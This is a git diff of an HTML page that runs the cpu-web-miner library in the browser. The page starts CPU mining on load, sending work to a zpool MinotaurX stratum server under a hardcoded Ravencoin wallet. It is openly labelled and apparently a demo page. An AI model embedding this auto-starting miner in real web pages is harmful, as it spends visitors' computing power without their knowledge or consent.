@@ -1,29 +1,22 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
 <body>
-
-<h2>Thanks for using cpu-web-miner</h2>
-
-<script type="module">
-import * as cpuWebMiner from 'https://esm.run/@marco_ciaramella/cpu-web-miner';
-
-const stratum = {
-    server: "minotaurx.na.mine.zpool.ca",
-    port: 7019,
-    worker: "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q",
-    password: "c=RVN",
-    ssl: false // true when pool uses SSL, false otherwise
-}
-
-cpuWebMiner.start(
-    cpuWebMiner.minotaurx,
-    stratum,
-    null,
-    5,
-    work => console.log(work),
-    hashrate => console.log(hashrate),
-    error => console.log(error));
-</script> 
-
+    <h2>Thanks for using cpu-web-miner</h2>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.js"></script>
+  <script src="app.js"></script>
+  <script>
+    const stratum = {
+      server: "minotaurx.na.mine.zpool.ca",
+      port: 7019,
+      worker: "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q",
+      password: "c=RVN"
+    }
+    mine(algos.minotaurx, stratum, true, 2)
+  </script>
 </body>
 </html>
